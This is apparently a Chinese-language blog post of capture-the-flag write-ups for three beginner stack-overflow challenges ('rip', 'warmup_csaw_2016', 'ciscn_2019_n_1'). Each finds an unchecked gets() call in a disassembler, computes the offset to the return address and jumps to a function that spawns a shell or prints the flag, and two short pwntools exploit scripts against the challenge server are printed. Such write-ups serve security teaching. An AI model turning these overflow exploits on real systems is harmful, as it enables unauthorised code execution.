---
layout: post
---
# rip
先查看一下开了哪些保护

![image](https://user-images.githubusercontent.com/98165037/188303228-82ab9753-9b76-4bd4-85d5-21e54f7f9e3c.png)

几乎没开什么保护

放进ida看看

![image](https://user-images.githubusercontent.com/98165037/188303300-b7aac343-6559-44c2-a808-26ac8cb60769.png)

看到gets函数，一个明显的溢出点

然后又发现了一个fun函数（后门函数？）可以直接get shell

![image](https://user-images.githubusercontent.com/98165037/188303382-39a84a3f-4873-4b52-b3a2-683fe27772f3.png)

所以就是通过gets函数溢出覆盖到rbp然后ret到fun函数地址去执行

这里看到fun函数地址是0x401186

![image](https://user-images.githubusercontent.com/98165037/188303687-0c2d3d55-c6ac-41c4-be4e-c723a63eb1b3.png)

或者直接ret到0x40118A执行system("/bin/sh")

双击s看到s距离rbp 15个字节，并且rbp有8字节，所以一共要覆盖（0xf+0x8）字节的长度

![image](https://user-images.githubusercontent.com/98165037/188303576-db6e46ea-c60f-41cb-a0b9-ca36655ed1a8.png)

所以exp如下

![image](https://user-images.githubusercontent.com/98165037/188303611-7c8e565a-d00c-4aa7-83e9-8324a495c9d7.png)
# warmup_csaw_2016
checksec一下

![image](https://user-images.githubusercontent.com/98165037/188305580-3b29e959-c502-4d52-b6f7-b4df1cd15c30.png)

耶没什么保护

ida打开

![image](https://user-images.githubusercontent.com/98165037/188305649-aa309e65-45d4-4688-86bf-fa906758d633.png)

显然又是gets

又非常幸运地找到了一个nice的函数，能够让我们看到flag

![image](https://user-images.githubusercontent.com/98165037/188305730-09de9ad7-fb23-4576-8b35-e2844efec57d.png)

查看它的地址

![image](https://user-images.githubusercontent.com/98165037/188305764-6ae6e05b-41e0-4a39-ac4a-334c5561314a.png)

直接ret到0x400611好了

再看看gets的参数v5的情况

![image](https://user-images.githubusercontent.com/98165037/188305820-c42f260e-3197-4410-830b-b91fc3187cf0.png)

到rbp的距离是0x40，rbp占8个字节，所以一个要覆盖（0x40+8）个字节

exp如下
```python
from pwn import *
io = remote('node4.buuoj.cn',29055)
payload = b'a'*(0x40+0x8)+p64(0x400611)
io.send(payload)
io.interactive()
```
但我需要手动ls才能看到

![image](https://user-images.githubusercontent.com/98165037/188305948-9a73121c-3ee2-4d72-94de-5000837f2849.png)
# ciscn_2019_n_1
checksec一下

![image](https://user-images.githubusercontent.com/98165037/188307032-fbd1e50f-e21c-4366-bab3-1aa9a5c6b4b8.png)

开了NX保护
> NX即No-eXecute（不可执行）的意思，Windows平台上称为DEP，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。
>
ida里打开

![image](https://user-images.githubusercontent.com/98165037/188307228-4a87c14e-672b-4856-807c-b299e07dd29c.png)

gets函数get！又直接有system("cat /flag")，但是它的条件为假，可以利用gets函数溢出，跳过条件判断，直接跳到system的执行

![image](https://user-images.githubusercontent.com/98165037/188307340-786b4ad7-a2a7-45eb-849d-d4ac3900b5f7.png)

该语句地址为0x4006BE

再看gets函数的参数v1，离rbp有0x30字节，并且rbp占8字节，一共（0x30+8）字节

![image](https://user-images.githubusercontent.com/98165037/188307433-9e0d7c2d-336a-4ce9-9303-41ede84ec32c.png)

exp如下

```python
from pwn import *
io = remote('node4.buuoj.cn',27107)
payload = b'a'*(0x30+0x8)+p64(0x4006BE)
io.send(payload)
io.interactive()
```

